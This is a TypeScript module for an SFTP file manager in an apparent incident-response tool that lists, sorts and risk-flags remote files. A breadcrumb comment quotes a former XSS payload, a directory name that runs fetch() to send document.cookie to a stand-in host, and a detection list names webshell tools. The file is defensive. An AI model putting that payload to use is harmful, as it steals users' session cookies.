/**
 * SFTP文件管理器
 * 处理远程文件操作
 */

import { sshConnectionManager } from './sshConnectionManager';
import { iconForFile, createIconHTML } from '../ui/iconMapping';
// 目标机由攻击者控制：文件名、属主、路径都是不可信输入，全部要转义后才能进 innerHTML
import { escapeHtml } from '../core/htmlEscape';

import { logger } from '../core/logger';
/** 正式包 drop 掉 console，诊断信息只有进 logger 才留得下来（设置→工具→诊断日志 可导出） */
const log = logger.module('SFTP');


export interface SftpFileInfo {
  name: string;
  path: string;
  file_type: string; // "file", "directory", "symlink"
  size: number;
  permissions: string;
  modified?: string;
  owner?: string;
  group?: string;
}

// Common UID→name mapping for emergency response
const COMMON_UID_MAP: Record<string, string> = {
  '0': 'root', '1': 'daemon', '2': 'bin', '33': 'www-data',
  '65534': 'nobody', '65533': 'nogroup', '99': 'nobody',
  '1000': 'user', '48': 'apache', '1001': 'user',
};

export class SftpManager {
  private currentPath: string = '/';
  private fileList: SftpFileInfo[] = [];
  private listeners: Array<(files: SftpFileInfo[], path: string) => void> = [];
  private sortMode: 'name-asc' | 'name-desc' | 'size-asc' | 'size-desc' | 'modified-asc' | 'modified-desc' = 'name-asc';
  private collator = new Intl.Collator(undefined, { sensitivity: 'base', numeric: true, ignorePunctuation: true });
  private uidNameCache: Record<string, string> = {};
  private uidCacheLoaded = false;
  /** getCurrentFiles() 的排序结果缓存；fileList 或 sortMode 变化时置空 */
  private sortedCache: SftpFileInfo[] | null = null;

  /**
   * 设置排序方式，目录始终排在文件之前
   */
  setSortMode(mode: 'name-asc' | 'name-desc' | 'size-asc' | 'size-desc' | 'modified-asc' | 'modified-desc'): void {
    this.sortMode = mode;
    this.sortedCache = null;
    this.notifyListeners();
  }

  /**
   * 获取当前排序模式
   */
  getSortMode(): string {
    return this.sortMode;
  }

  private sortFiles(files: SftpFileInfo[]): SftpFileInfo[] {
    const isDir = (f: SftpFileInfo) => f.file_type === 'directory';
    const dirFirst = (a: SftpFileInfo, b: SftpFileInfo) => {
      if (isDir(a) && !isDir(b)) return -1;
      if (!isDir(a) && isDir(b)) return 1;
      return 0;
    };

    const nameCmp = (a: SftpFileInfo, b: SftpFileInfo) => this.collator.compare(a.name, b.name);
    const sizeCmp = (a: SftpFileInfo, b: SftpFileInfo) => a.size - b.size;
    const modifiedCmp = (a: SftpFileInfo, b: SftpFileInfo) => {
      const aTime = a.modified ? new Date(a.modified).getTime() : 0;
      const bTime = b.modified ? new Date(b.modified).getTime() : 0;
      return aTime - bTime;
    };

    const withinGroupCmp = (a: SftpFileInfo, b: SftpFileInfo) => {
      let cmp = 0;
      if (this.sortMode.startsWith('name-')) {
        cmp = nameCmp(a, b);
        return this.sortMode === 'name-desc' ? -cmp : cmp;
      } else if (this.sortMode.startsWith('size-')) {
        cmp = sizeCmp(a, b);
        return this.sortMode === 'size-desc' ? -cmp : cmp;
      } else if (this.sortMode.startsWith('modified-')) {
        cmp = modifiedCmp(a, b);
        return this.sortMode === 'modified-desc' ? -cmp : cmp;
      }
      return 0;
    };

    return [...files].sort((a, b) => {
      const group = dirFirst(a, b);
      if (group !== 0) return group;
      return withinGroupCmp(a, b);
    });
  }

  /**
   * 获取当前文件列表
   */
  /**
   * 当前展示顺序的文件列表 —— **索引的唯一真相来源**。
   *
   * 表格渲染、右键菜单、详情面板、双击导航必须全部按这个顺序取下标。
   * 曾经的 bug：fileList 存的是抓取时排好序的副本，而 setSortMode 只改
   * sortMode 不重排，渲染却按重新排序的结果编号 —— 点过排序表头后，
   * 右键"删除"删掉的是另一个文件，而详情面板显示的又是对的那个。
   */
  getCurrentFiles(): SftpFileInfo[] {
    if (!this.sortedCache) this.sortedCache = this.sortFiles(this.fileList);
    return this.sortedCache;
  }

  /**
   * 刷新当前目录
   */
  async refreshCurrentDirectory(): Promise<void> {
    try {
      await this.refreshFileList();
    } catch (error) {
      log.error('刷新目录失败:', error);
    }
  }

  /**
   * 获取当前路径
   */
  getCurrentPath(): string {
    return this.currentPath;
  }

  /**
   * 规范化远程路径：统一为POSIX风格，去重/及去除末尾/
   */
  public normalizePath(p: string): string {
    let np = (p || '/').replace(/\\/g, '/');
    np = np.replace(/\/+/g, '/');
    if (!np.startsWith('/')) np = '/' + np;
    if (np.length > 1 && np.endsWith('/')) np = np.slice(0, -1);
    return np;
  }

  /**
   * 获取当前文件列表
   */
  getFileList(): SftpFileInfo[] {
    return this.fileList;
  }

  /**
   * 异步加载 uid→username 映射缓存
   */
  private async loadUidNameCache(): Promise<void> {
    if (this.uidCacheLoaded) return;
    try {
      const result: any = await (window as any).__TAURI__.core.invoke('ssh_execute_command_direct', {
        command: "cat /etc/passwd 2>/dev/null | cut -d: -f1,3"
      });
      const output = result?.output || '';
      for (const line of output.split('\n')) {
        const [name, uid] = line.split(':');
        if (name && uid) this.uidNameCache[uid.trim()] = name.trim();
      }
      // Also load group names
      const gResult: any = await (window as any).__TAURI__.core.invoke('ssh_execute_command_direct', {
        command: "cat /etc/group 2>/dev/null | cut -d: -f1,3"
      });
      const gOutput = gResult?.output || '';
      for (const line of gOutput.split('\n')) {
        const [name, gid] = line.split(':');
        if (name && gid) this.uidNameCache[`g${gid.trim()}`] = name.trim();
      }
      this.uidCacheLoaded = true;
    } catch {
      // Silent fail - will show numeric uids
    }
  }

  /**
   * 解析 owner 显示名称
   */
  resolveOwnerName(uid: string | undefined): string {
    if (!uid) return '-';
    // If it's already a name (not purely numeric), return as-is
    if (!/^\d+$/.test(uid)) return uid;
    return this.uidNameCache[uid] || COMMON_UID_MAP[uid] || uid;
  }

  /**
   * 解析 group 显示名称
   */
  resolveGroupName(gid: string | undefined): string {
    if (!gid) return '-';
    if (!/^\d+$/.test(gid)) return gid;
    return this.uidNameCache[`g${gid}`] || COMMON_UID_MAP[gid] || gid;
  }

  /**
   * 刷新文件列表
   *
   * @returns 是否成功拿到新列表。失败时 fileList 保持不变，调用方应据此
   *          决定是否回滚已经改掉的 currentPath。
   */
  async refreshFileList(): Promise<boolean> {
    if (!sshConnectionManager.isConnected()) {
      log.warn('SSH未连接，无法刷新SFTP文件列表');
      return false;
    }

    try {
      // Load uid cache in background on first access
      if (!this.uidCacheLoaded) {
        this.loadUidNameCache().catch((e) => log.warn('UID缓存加载失败:', e));
      }

      const files = await (window as any).__TAURI__.core.invoke('sftp_list_files', {
        path: this.currentPath
      });

      // 存原始顺序；展示顺序统一由 getCurrentFiles() 负责
      this.fileList = files;
      this.sortedCache = null;
      this.notifyListeners();

      sshConnectionManager.updateLastActivity();
      return true;

    } catch (error) {
      log.error('获取SFTP文件列表失败:', error);
      window.showNotification && window.showNotification(`获取文件列表失败: ${error}`, 'error');
      // 返回 false 而不是 throw：本方法有 8 个调用点，其中几个是裸 await，
      // 抛异常会变成未处理的 rejection。调用方按需检查返回值即可
      // （navigateToPath 用它回滚路径），忽略返回值的调用方行为不变。
      return false;
    }
  }

  /**
   * 导航到指定路径
   */
  async navigateToPath(path: string): Promise<void> {
    if (this.isNavigating) {
      log.debug('正在导航中，忽略新的导航请求');
      return;
    }

    const previousPath = this.currentPath;
    try {
      this.isNavigating = true;
      const normalized = this.normalizePath(path);
      log.debug('导航到路径:', normalized);
      this.currentPath = normalized;
      const ok = await this.refreshFileList();
      if (!ok && previousPath !== normalized) {
        // 加载失败（如权限不足）时回到原路径并重绘，
        // 避免出现"面包屑显示新目录、列表却是旧目录内容"的错位状态。
        // refreshFileList 已经提示过用户，这里只负责恢复一致性。
        this.currentPath = previousPath;
        this.notifyListeners();
      }
    } finally {
      this.isNavigating = false;
    }
  }

  /**
   * 导航到上级目录
   */
  async navigateToParent(): Promise<void> {
    const cur = this.normalizePath(this.currentPath);
    if (cur === '/') return;
    const parentPath = cur.split('/').slice(0, -1).join('/') || '/';
    await this.navigateToPath(parentPath);
  }

  /**
   * 处理文件点击
   */
  async handleFileClick(file: SftpFileInfo): Promise<void> {
    if (file.file_type === 'directory') {
      await this.navigateToPath(file.path);
    } else {
      log.debug('点击文件:', file.name);
    }
  }

  /**
   * 检测文件风险等级 (用于应急响应高亮)
   * 返回: 'risk-critical' | 'risk-warning' | 'risk-info' | ''
   */
  private getFileRiskClass(file: SftpFileInfo): string {
    const name = file.name;
    const perms = file.permissions || '';
    const permsNum = parseInt(perms, 8) || 0;
    const lowBits = permsNum & 0o7777;

    // Critical: SUID/SGID 可执行文件
    if ((permsNum & 0o4000) || (permsNum & 0o2000)) {
      if (file.file_type === 'file') return 'risk-critical';
    }

    // Critical: 777 权限
    if ((lowBits & 0o777) === 0o777) return 'risk-critical';

    // Warning: 可疑文件名模式
    const suspiciousPatterns = [
      /\.(php|jsp|asp|aspx|cgi)$/i,        // Web shell 常见扩展
      /^\..*\.(sh|py|pl|rb)$/i,            // 隐藏脚本
      /^(shell|backdoor|hack|exploit|c99|r57|b374k|webshell)/i,
      /\.(suspected|malware|infected)$/i,
      /^\.\.[ ]/,                            // 伪装的 ..空格 目录
    ];
    for (const pat of suspiciousPatterns) {
      if (pat.test(name)) return 'risk-warning';
    }

    // Warning: 特殊隐藏文件在敏感目录
    if (name.startsWith('.') && name !== '..' && name !== '.' && file.file_type === 'file') {
      const sensitiveDirs = ['/tmp', '/dev/shm', '/var/tmp', '/run'];
      if (sensitiveDirs.some(d => this.currentPath.startsWith(d))) {
        return 'risk-warning';
      }
    }

    // Info: 隐藏文件
    if (name.startsWith('.') && name !== '..' && name !== '.') {
      return 'risk-info';
    }

    // Info: 世界可写文件 (不含目录)
    if (file.file_type === 'file' && (lowBits & 0o002)) {
      return 'risk-info';
    }

    return '';
  }

  /** 风险列徽章 */
  private riskBadgeHtml(riskClass: string): string {
    if (riskClass === 'risk-critical') return '<span class="sftp-risk-tag high">可疑</span>';
    if (riskClass === 'risk-warning') return '<span class="sftp-risk-tag warn">敏感</span>';
    if (riskClass === 'risk-info') return '<span class="sftp-risk-tag info">隐藏</span>';
    return '<span class="sftp-risk-none">-</span>';
  }

  /** 文件类型标签 */
  private getFileTypeLabel(file: SftpFileInfo): string {
    if (file.file_type === 'directory') return '文件夹';
    if (file.file_type === 'symlink') return '链接';
    const n = file.name.toLowerCase();
    if (/\.pub$/.test(n)) return '公钥';
    if (/\.(pem|key)$/.test(n) || /^id_(rsa|dsa|ecdsa|ed25519)$/.test(n)) return '私钥';
    if (/\.(conf|cfg|ini|yaml|yml|toml)$/.test(n) || n === 'config') return '配置';
    if (/\.log$/.test(n)) return '日志';
    if (/\.(sh|bash|zsh|py|pl|rb|js|ts|php)$/.test(n)) return '脚本';
    return '文件';
  }

  /**
   * 渲染面包屑导航 HTML
   */
  renderBreadcrumbHTML(): string {
    const parts = this.currentPath.split('/').filter(Boolean);
    // 路径经 data-path 传递、由委托监听读取 dataset —— 值不会被当作 JS 解析。
    // 原先是内联 onclick 里拼 navigateToPath('<路径>')，一个名为
    // `'); fetch('http://x/'+document.cookie); //` 的目录即可执行任意脚本。
    let html = '<span class="breadcrumb-segment breadcrumb-root" data-path="/" title="根目录">/</span>';

    let accumulated = '';
    for (let i = 0; i < parts.length; i++) {
      accumulated += '/' + parts[i];
      const isLast = i === parts.length - 1;
      html += '<span class="breadcrumb-sep">›</span>';
      html += `<span class="breadcrumb-segment${isLast ? ' breadcrumb-current' : ''}" data-path="${escapeHtml(accumulated)}" title="${escapeHtml(accumulated)}">${escapeHtml(parts[i])}</span>`;
    }
    return html;
  }

  /**
   * 绑定 SFTP 页面的全部事件委托（工具栏 / 路径栏 / 表格 / 面包屑）。
   *
   * **必须在每次页面渲染后调用**，而不是只在首次初始化时调用：
   * renderMainWorkspace 用 outerHTML 整体替换工作区，切走再切回来时页面
   * 容器是全新节点，旧节点上的监听随它一起消失。而
   * initRemoteOperationsPage 有个模块级 initialized 标志会提前 return，
   * 所以不能把绑定挂在它上面。
   *
   * 每个容器用 dataset 守卫，重复调用无副作用。
   */
  bindUIEvents(): void {
    const tbody = document.getElementById('sftp-file-list');
    if (tbody && !tbody.dataset.sftpBound) {
      tbody.dataset.sftpBound = '1';

      const rowIndex = (e: Event): number | null => {
        const row = (e.target as HTMLElement)?.closest?.('tr.sftp-file-row') as HTMLElement | null;
        if (!row) return null;
        if (row.dataset.action === 'parent') return -1;
        const raw = row.dataset.fileIndex;
        return raw === undefined ? null : Number(raw);
      };

      tbody.addEventListener('click', (e) => {
        // 勾选框自己处理，不要连带打开详情
        if ((e.target as HTMLElement)?.classList?.contains('sftp-row-check')) return;
        const idx = rowIndex(e);
        if (idx === null) return;
        if (idx === -1) { void this.navigateToParent(); return; }
        (window as any).openSftpDetail?.(idx);
      });

      tbody.addEventListener('dblclick', (e) => {
        const idx = rowIndex(e);
        if (idx === null || idx === -1) return;
        void this.handleFileClickByIndex(idx);
      });

      tbody.addEventListener('contextmenu', (e) => {
        const idx = rowIndex(e);
        if (idx === null) return;
        e.preventDefault();
        if (idx === -1) return;
        (window as any).showSftpContextMenu?.(e, idx);
      });
    }

    const breadcrumb = document.getElementById('sftp-breadcrumb');
    if (breadcrumb && !breadcrumb.dataset.sftpBound) {
      breadcrumb.dataset.sftpBound = '1';
      breadcrumb.addEventListener('click', (e) => {
        const seg = (e.target as HTMLElement)?.closest?.('.breadcrumb-segment') as HTMLElement | null;
        const path = seg?.dataset.path;
        if (path) void this.navigateToPath(path);
      });
    }

    this.bindPageEvents();
  }

  /** 绑定页面级控件（工具栏、路径输入、搜索、排序表头、溢出菜单） */
  private bindPageEvents(): void {
    const page = document.getElementById('sftp-page');
    if (!page || page.dataset.sftpBound) return;
    page.dataset.sftpBound = '1';

    const w = window as any;
    const actions: Record<string, () => void> = {
      upload: () => w.sftpOpenUpload?.(),
      refresh: () => w.sftpRefresh?.(),
      'new-folder': () => w.sftpOpenCreateFolder?.(),
      'new-file': () => w.sftpCreateFile?.(),
      snapshot: () => w.sftpIntegritySnapshot?.(),
      history: () => w.toggleSftpHistory?.(),
      'toggle-side': () => w.toggleSftpSide?.(),
      up: () => void this.navigateToParent(),
      home: () => void this.navigateToPath('/'),
      'toggle-more': () => this.toggleMoreMenu(),
    };

    page.addEventListener('click', (e) => {
      const target = e.target as HTMLElement;

      const actionEl = target?.closest?.('[data-sftp-action]') as HTMLElement | null;
      if (actionEl) {
        const name = actionEl.dataset.sftpAction!;
        // 点"更多"以外的任何按钮都先收起溢出菜单
        if (name !== 'toggle-more') this.closeMoreMenu();
        actions[name]?.();
        return;
      }

      // 排序表头：再次点击同一列时切换升降序
      const th = target?.closest?.('[data-sftp-sort]') as HTMLElement | null;
      if (th) {
        const field = th.dataset.sftpSort!;
        const asc = `${field}-asc`;
        const next = this.sortMode === asc ? `${field}-desc` : asc;
        w.setSftpSortMode?.(next);
        return;
      }

      if (target?.id === 'sftp-check-all') {
        w.sftpToggleAll?.((target as HTMLInputElement).checked);
        return;
      }

      // 点击空白处收起溢出菜单
      this.closeMoreMenu();
    });

    const pathInput = document.getElementById('sftp-path-input') as HTMLInputElement | null;
    if (pathInput) {
      pathInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') void this.navigateToPath(pathInput.value);
      });
      pathInput.addEventListener('focus', () => pathInput.parentElement?.classList.add('editing'));
      pathInput.addEventListener('blur', () => pathInput.parentElement?.classList.remove('editing'));
    }

    const searchInput = document.getElementById('sftp-search-input') as HTMLInputElement | null;
    searchInput?.addEventListener('input', () => w.sftpFilterFiles?.(searchInput.value));

    // Esc 收起溢出菜单
    page.addEventListener('keydown', (e) => {
      if ((e as KeyboardEvent).key === 'Escape') this.closeMoreMenu();
    });
  }

  private toggleMoreMenu(): void {
    const menu = document.getElementById('sftp-more-menu');
    const btn = document.querySelector('[data-sftp-action="toggle-more"]');
    const open = menu?.classList.toggle('show') ?? false;
    btn?.setAttribute('aria-expanded', String(open));
  }

  private closeMoreMenu(): void {
    const menu = document.getElementById('sftp-more-menu');
    if (!menu?.classList.contains('show')) return;
    menu.classList.remove('show');
    document.querySelector('[data-sftp-action="toggle-more"]')?.setAttribute('aria-expanded', 'false');
  }

  /**
   * 更新排序指示器
   */
  updateSortIndicators(): void {
    const indicators: Record<string, string> = { name: '', size: '', modified: '' };
    const [field, direction] = this.sortMode.split('-');
    if (field && indicators.hasOwnProperty(field)) {
      indicators[field] = direction === 'asc' ? '▲' : '▼';
    }

    // Update indicator text and active state
    for (const [key, arrow] of Object.entries(indicators)) {
      const ind = document.getElementById(`sort-ind-${key}`);
      const th = document.getElementById(`sftp-th-${key}`);
      if (ind) ind.textContent = arrow;
      if (th) {
        if (arrow) th.classList.add('sort-active');
        else th.classList.remove('sort-active');
      }
    }
  }

  /**
   * 渲染文件列表HTML（返回<tr>行，供#sftp-file-list tbody插入）
   */
  renderFileListHTML(): string {
    // 未连接时显示一行提示
    if (!sshConnectionManager.isConnected()) {
      return `
        <tr>
          <td colspan="8" class="sftp-placeholder-cell">
            <div class="sftp-placeholder">
              <div class="sftp-placeholder-icon">${createIconHTML('📡', { size: 24 })}</div>
              <span>SSH未连接 — 请先建立连接</span>
            </div>
          </td>
        </tr>
      `;
    }

    // 空目录
    if (this.fileList.length === 0) {
      return `
        <tr>
          <td colspan="8" class="sftp-placeholder-cell">
            <div class="sftp-placeholder">
              <div class="sftp-placeholder-icon">${createIconHTML('📁', { size: 24 })}</div>
              <span>目录为空</span>
            </div>
          </td>
        </tr>
      `;
    }

    let html = '';
    let riskCount = 0;

    // 上级目录项
    if (this.currentPath !== '/') {
      html += `
        <tr class="sftp-file-row parent-dir-item" data-action="parent">
          <td class="sftp-td-check"></td>
          <td class="file-icon-cell">
            <div class="file-icon">${iconForFile('', true)}</div>
            <span class="file-name">..</span>
          </td>
          <td class="sftp-td-type">-</td>
          <td class="sftp-td-size">-</td>
          <td class="perms-cell">-</td>
          <td class="owner-cell">-</td>
          <td class="sftp-td-time">上级目录</td>
          <td class="sftp-td-risk">-</td>
        </tr>
      `;
    }

    // 已按规则排序的文件和目录
    const sortedFiles = this.getCurrentFiles();
    sortedFiles.forEach((file, index) => {
      const icon = this.getFileIcon(file);
      const sizeText = file.file_type === 'directory' ? '-' : this.formatFileSize(file.size);
      const perms = this.formatPermissionsSymbolic(file.permissions);
      const modified = this.formatModifiedDate((file as any).modified);
      const ownerName = this.resolveOwnerName(file.owner);
      const groupName = this.resolveGroupName(file.group);
      const ownerDisplay = groupName !== '-' ? `${ownerName}:${groupName}` : ownerName;

      // Risk detection
      const riskClass = this.getFileRiskClass(file);
      const typeLabel = this.getFileTypeLabel(file);
      const riskTag = this.riskBadgeHtml(riskClass);
      if (riskClass === 'risk-critical' || riskClass === 'risk-warning') riskCount++;

      // Root owner highlight
      const ownerClass = ownerName === 'root' ? 'owner-root' : '';

      // file.name / ownerDisplay 来自远程且属主名还掺了 /etc/passwd 的解析结果，
      // 全部是攻击者可控的；typeLabel/perms/modified 目前取自封闭集合，
      // 一并转义以免日后有人扩展来源时漏掉。icon 是我们自己生成的 SVG，保持原样。
      html += `
        <tr class="sftp-file-row ${riskClass}" data-file-index="${index}">
          <td class="sftp-td-check"><input type="checkbox" class="sftp-row-check"></td>
          <td class="file-icon-cell">
            <div class="file-icon">${icon}</div>
            <span class="file-name" title="${escapeHtml(file.name)}">${escapeHtml(file.name)}</span>
          </td>
          <td class="sftp-td-type">${escapeHtml(typeLabel)}</td>
          <td class="sftp-td-size">${escapeHtml(sizeText)}</td>
          <td class="perms-cell">${escapeHtml(perms)}</td>
          <td class="owner-cell ${ownerClass}">${escapeHtml(ownerDisplay)}</td>
          <td class="sftp-td-time">${escapeHtml(modified)}</td>
          <td class="sftp-td-risk">${riskTag}</td>
        </tr>
      `;
    });

    // Update status bar
    setTimeout(() => {
      // 内容替换完成后（重）绑定委托监听；内部有 dataset 守卫，重复调用无副作用
      this.bindUIEvents();

      // 计数与风险数已从底部状态栏移到标题旁的 chip（底部状态栏没人看）
      const countEl = document.getElementById('sftp-chip-count');
      if (countEl) countEl.textContent = `${sortedFiles.length} 项`;

      const riskEl = document.getElementById('sftp-chip-risk');
      const riskCountEl = document.getElementById('sftp-risk-count');
      if (riskEl && riskCountEl) {
        riskEl.hidden = riskCount === 0;
        if (riskCount > 0) riskCountEl.textContent = String(riskCount);
      }

      // Update breadcrumb
      const breadcrumb = document.getElementById('sftp-breadcrumb');
      if (breadcrumb) breadcrumb.innerHTML = this.renderBreadcrumbHTML();

      // 当前路径已由面包屑呈现，底部状态栏的重复显示随状态栏一并移除

      // 敏感目录审计横幅：在敏感目录（或其子目录）时显示
      const banner = document.getElementById('sftp-audit-banner');
      if (banner) {
        const sens = ['/root/.ssh', '/etc/cron.d', '/var/spool/cron', '/etc/init.d', '/dev/shm', '/tmp', '/var/tmp', '/run'];
        const inSens = sens.some(d => this.currentPath === d || this.currentPath.startsWith(d + '/'));
        banner.style.display = inSens ? '' : 'none';
      }

      // Update sort indicators
      this.updateSortIndicators();
    }, 0);

    return html;
  }

  /**
   * 通过索引处理文件点击（用于HTML onclick）
   */
  async handleFileClickByIndex(index: number): Promise<void> {
    try {
      // 必须用 getCurrentFiles()：下标是渲染时按展示顺序发的
      const files = this.getCurrentFiles();
      if (index >= 0 && index < files.length) {
        const file = files[index];
        log.debug('点击文件', { name: file.name, type: file.file_type });

        if (this.isNavigating) {
          log.debug('正在导航中，忽略点击');
          return;
        }

        await this.handleFileClick(file);
      }
    } catch (error) {
      log.error('处理文件点击失败:', error);
    }
  }


  public getFileByIndex(index: number): SftpFileInfo | null {
    // 同 handleFileClickByIndex：下标属于展示顺序，不是抓取顺序。
    // 右键菜单的删除/重命名走这里 —— 取错等于对错误的文件执行破坏性操作。
    const files = this.getCurrentFiles();
    if (index < 0 || index >= files.length) return null;
    return files[index];
  }

  private isNavigating: boolean = false;

  /**
   * 获取文件图标 (增强版，更多文件类型)
   */
  private getFileIcon(file: SftpFileInfo): string {
    // 统一走 IconPark（emoji → SVG），authorized_keys/known_hosts 视为密钥文件
    const name = file.name.toLowerCase();
    const isKey = name === 'authorized_keys' || name === 'known_hosts';
    return iconForFile(
      isKey ? 'k.pem' : file.name,
      file.file_type === 'directory',
      file.file_type === 'symlink',
    );
  }

  /**
   * 格式化文件大小
   */
  private formatFileSize(bytes: number): string {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
  }

  /**
   * 格式化上次修改时间
   */
  private formatModifiedDate(input: any): string {
    if (input === undefined || input === null || input === '') return '';
    let date: Date;
    if (typeof input === 'number') {
      const ms = input < 1e12 ? input * 1000 : input;
      date = new Date(ms);
    } else if (typeof input === 'string') {
      const num = Number(input);
      if (!isNaN(num)) {
        const ms = num < 1e12 ? num * 1000 : num;
        date = new Date(ms);
      } else {
        date = new Date(input);
      }
    } else {
      return '';
    }
    if (isNaN(date.getTime())) return '';
    try {
      return new Intl.DateTimeFormat(undefined, {
        year: 'numeric', month: '2-digit', day: '2-digit',
        hour: '2-digit', minute: '2-digit'
      }).format(date);
    } catch {
      return date.toLocaleString();
    }
  }

  /**
   * 格式化权限为符号形式 (如 rwxr-xr-x)
   */
  private formatPermissionsSymbolic(octal: string): string {
    const digits = (octal || '').replace(/^0+/, '').padStart(3, '0').slice(-3);
    const toTriplet = (n: number) => {
      const r = (n & 4) ? 'r' : '-';
      const w = (n & 2) ? 'w' : '-';
      const x = (n & 1) ? 'x' : '-';
      return r + w + x;
    };
    const u = parseInt(digits[0], 8);
    const g = parseInt(digits[1], 8);
    const o = parseInt(digits[2], 8);
    return toTriplet(u) + toTriplet(g) + toTriplet(o);
  }


  /**
   * 添加监听器
   */
  addListener(listener: (files: SftpFileInfo[], path: string) => void): void {
    this.listeners.push(listener);
  }

  /**
   * 移除监听器
   */
  removeListener(listener: (files: SftpFileInfo[], path: string) => void): void {
    const index = this.listeners.indexOf(listener);
    if (index > -1) {
      this.listeners.splice(index, 1);
    }
  }

  /**
   * 通知监听器
   */
  private notifyListeners(): void {
    this.listeners.forEach(listener => {
      try {
        listener(this.fileList, this.currentPath);
      } catch (error) {
        log.error('SFTP文件列表监听器执行失败:', error);
      }
    });
  }
}

// 全局SFTP管理器实例
export const sftpManager = new SftpManager();
